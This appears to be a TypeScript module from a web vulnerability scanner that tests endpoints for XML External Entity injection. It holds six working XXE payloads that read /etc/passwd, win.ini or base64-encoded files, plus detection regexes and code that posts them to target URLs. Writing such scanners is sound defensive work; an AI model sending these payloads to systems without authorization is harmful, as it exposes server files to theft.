import { randomUUID } from 'node:crypto';
import type { BrowserContext } from 'playwright';
import type { RawFinding, ScanConfig } from '../types.js';
import { log } from '../../utils/logger.js';
import type { RequestLogger } from '../../utils/request-logger.js';
import type { ActiveCheck } from './index.js';
import { delay } from '../../utils/shared.js';

// ─── XXE Payload Definitions ────────────────────────────────────────

/** Unique marker string to detect XXE success */
export const XXE_MARKER = 'secbot-xxe-';

/**
 * XXE payloads ordered from most to least likely to succeed.
 * All read /etc/passwd (Linux) or trigger DNS/error-based detection.
 */
export const XXE_PAYLOADS = [
  {
    name: 'classic-file-read',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>`,
    indicator: /root:.*:0:0|\/bin\/(ba)?sh|\/sbin\/nologin/,
    description: 'Classic XXE — reads /etc/passwd via SYSTEM entity',
  },
  {
    name: 'parameter-entity',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>`,
    indicator: /root:.*:0:0|\/bin\/(ba)?sh|error|DTD/i,
    description: 'Parameter entity XXE — uses % entity for blind detection',
  },
  {
    name: 'windows-file-read',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>`,
    indicator: /\[fonts\]|\[extensions\]|\[mci extensions\]/i,
    description: 'Windows XXE — reads win.ini',
  },
  {
    name: 'php-filter',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>`,
    indicator: /[A-Za-z0-9+/]{20,}={0,2}/,
    description: 'PHP filter XXE — base64-encodes file content to bypass binary filters',
  },
  {
    name: 'error-based',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///nonexistent-${Date.now()}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %error;
]>
<root>test</root>`,
    indicator: /file:\/\/\/nonexistent|No such file|SYSTEM.*entity|failed to load/i,
    description: 'Error-based XXE — triggers error messages revealing file paths',
  },
  {
    name: 'xinclude',
    payload: `<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>`,
    indicator: /root:.*:0:0|\/bin\/(ba)?sh/,
    description: 'XInclude — alternative to DOCTYPE when XML parsing is restricted',
  },
];

/**
 * Content types that accept XML input.
 * We test these to see if the server actually parses XML.
 */
export const XML_CONTENT_TYPES = [
  'application/xml',
  'text/xml',
  'application/soap+xml',
  'application/xhtml+xml',
];

/**
 * Known XML-accepting endpoints patterns.
 */
export const XML_ENDPOINT_PATTERNS = [
  /\/soap/i,
  /\/xmlrpc/i,
  /\/xml/i,
  /\/wsdl/i,
  /\/feed/i,
  /\/rss/i,
  /\/atom/i,
  /\/svg/i,
  /\/import/i,
  /\/upload/i,
  /\/parse/i,
];

// ─── Detection Helpers ──────────────────────────────────────────────

/**
 * Check if a response indicates XML parsing occurred.
 * This distinguishes "server accepts XML" from "server ignores XML."
 */
export function detectXmlParsing(
  responseBody: string,
  responseHeaders: Record<string, string>,
  status: number,
): boolean {
  // XML parsing error messages (server tried to parse our XML)
  if (/xml.*pars(e|ing)|SAX|DOCTYPE.*not allowed|entity.*not allowed|DTD|ENTITY|<!DOCTYPE/i.test(responseBody)) {
    return true;
  }

  // Response is XML/XHTML
  const ct = responseHeaders['content-type'] ?? '';
  if (/xml|xhtml/i.test(ct)) {
    return true;
  }

  // Server returned a different error than the usual 415 Unsupported Media Type
  // (415 means it rejected our content type; other errors mean it tried to parse)
  if (status >= 400 && status !== 415 && /xml|entity|doctype|dtd/i.test(responseBody)) {
    return true;
  }

  return false;
}

/**
 * Check if a response body contains XXE success indicators.
 */
export function detectXxeSuccess(
  body: string,
  payload: typeof XXE_PAYLOADS[number],
): { success: boolean; evidence: string } {
  if (payload.indicator.test(body)) {
    return {
      success: true,
      evidence: `XXE payload "${payload.name}" succeeded — response matches indicator: ${payload.indicator}`,
    };
  }
  return { success: false, evidence: '' };
}

// ─── Main Check ─────────────────────────────────────────────────────

export const xxeCheck: ActiveCheck = {
  name: 'xxe',
  category: 'xxe',
  async run(context, targets, config, requestLogger) {
    const findings: RawFinding[] = [];

    // Test API endpoints that might accept XML
    const candidateUrls = [
      ...targets.apiEndpoints,
      ...targets.pages.filter(u => XML_ENDPOINT_PATTERNS.some(p => p.test(u))),
    ];

    if (candidateUrls.length === 0) return findings;

    log.info(`Testing ${candidateUrls.length} endpoints for XXE injection...`);

    const maxUrls = config.profile === 'deep'
      ? candidateUrls.length
      : Math.min(5, candidateUrls.length);

    for (let i = 0; i < maxUrls; i++) {
      const url = candidateUrls[i];
      const urlFindings = await testXxeOnEndpoint(context, url, config, requestLogger);
      findings.push(...urlFindings);
      if (findings.length > 0) break;
      await delay(config.requestDelay);
    }

    return findings;
  },
};

async function testXxeOnEndpoint(
  context: BrowserContext,
  url: string,
  config: ScanConfig,
  requestLogger?: RequestLogger,
): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];

  // First, check if the endpoint accepts XML by sending a simple XML body
  let acceptsXml = false;
  const probePage = await context.newPage();
  try {
    for (const ct of XML_CONTENT_TYPES) {
      const probeResp = await probePage.request.fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': ct },
        data: '<?xml version="1.0"?><root>test</root>',
        maxRedirects: 3,
      });
      const probeBody = await probeResp.text();
      const probeStatus = probeResp.status();

      requestLogger?.log({
        timestamp: new Date().toISOString(),
        method: 'POST',
        url,
        responseStatus: probeStatus,
        phase: 'active-xxe-probe',
      });

      if (detectXmlParsing(probeBody, probeResp.headers(), probeStatus)) {
        acceptsXml = true;
        break;
      }

      // If we get 200 or a non-415 response, the endpoint might accept XML
      if (probeStatus !== 415 && probeStatus < 500) {
        acceptsXml = true;
        break;
      }
    }
  } catch (err) {
    log.debug(`XXE probe: ${(err as Error).message}`);
  } finally {
    await probePage.close();
  }

  if (!acceptsXml) return findings;

  // Test XXE payloads
  const payloads = config.profile === 'deep' ? XXE_PAYLOADS : XXE_PAYLOADS.slice(0, 3);

  for (const xxePayload of payloads) {
    const page = await context.newPage();
    try {
      const resp = await page.request.fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        data: xxePayload.payload,
        maxRedirects: 3,
      });
      const status = resp.status();
      const body = await resp.text();
      const headers = resp.headers();

      requestLogger?.log({
        timestamp: new Date().toISOString(),
        method: 'POST',
        url,
        responseStatus: status,
        phase: 'active-xxe',
      });

      const result = detectXxeSuccess(body, xxePayload);

      if (result.success) {
        const isFileRead = xxePayload.name.includes('file-read') || xxePayload.name === 'xinclude' || xxePayload.name === 'php-filter';
        findings.push({
          id: randomUUID(),
          category: 'xxe',
          severity: isFileRead ? 'critical' : 'high',
          title: `XML External Entity (XXE) Injection — ${xxePayload.name}`,
          description: `The endpoint accepts XML input and is vulnerable to XXE injection. ` +
            `${xxePayload.description}. ` +
            `An attacker can read arbitrary files from the server, perform SSRF, or cause denial of service.`,
          url,
          evidence: [
            `Technique: ${xxePayload.name}`,
            `Description: ${xxePayload.description}`,
            `Detection: ${result.evidence}`,
            `Response status: ${status}`,
            `Response snippet: ${body.slice(0, 300)}`,
          ].join('\n'),
          request: {
            method: 'POST',
            url,
            headers: { 'Content-Type': 'application/xml' },
            body: xxePayload.payload,
          },
          response: {
            status,
            headers: { 'content-type': headers['content-type'] ?? '' },
            bodySnippet: body.slice(0, 500),
          },
          timestamp: new Date().toISOString(),
          confidence: isFileRead ? 'high' : 'medium',
        });
        break;
      }

      // Check for XML parsing errors that reveal DTD processing is enabled
      if (detectXmlParsing(body, headers, status) && /entity|DOCTYPE|DTD/i.test(body)) {
        // DTD processing is enabled but file read failed — still informational
        if (!findings.some(f => f.url === url)) {
          findings.push({
            id: randomUUID(),
            category: 'xxe',
            severity: 'low',
            title: `XML DTD Processing Enabled (Potential XXE)`,
            description: `The endpoint accepts XML with DTD processing enabled. ` +
              `While direct file read was not confirmed, DTD processing is a prerequisite for XXE. ` +
              `This may be exploitable with out-of-band (OOB) XXE techniques.`,
            url,
            evidence: [
              `Technique: ${xxePayload.name}`,
              `DTD processing detected in response`,
              `Response snippet: ${body.slice(0, 300)}`,
            ].join('\n'),
            request: {
              method: 'POST',
              url,
              headers: { 'Content-Type': 'application/xml' },
            },
            response: {
              status,
              bodySnippet: body.slice(0, 300),
            },
            timestamp: new Date().toISOString(),
            confidence: 'low',
          });
        }
      }
    } catch (err) {
      log.debug(`XXE test: ${(err as Error).message}`);
    } finally {
      await page.close();
    }

    await delay(config.requestDelay);
  }

  return findings;
}
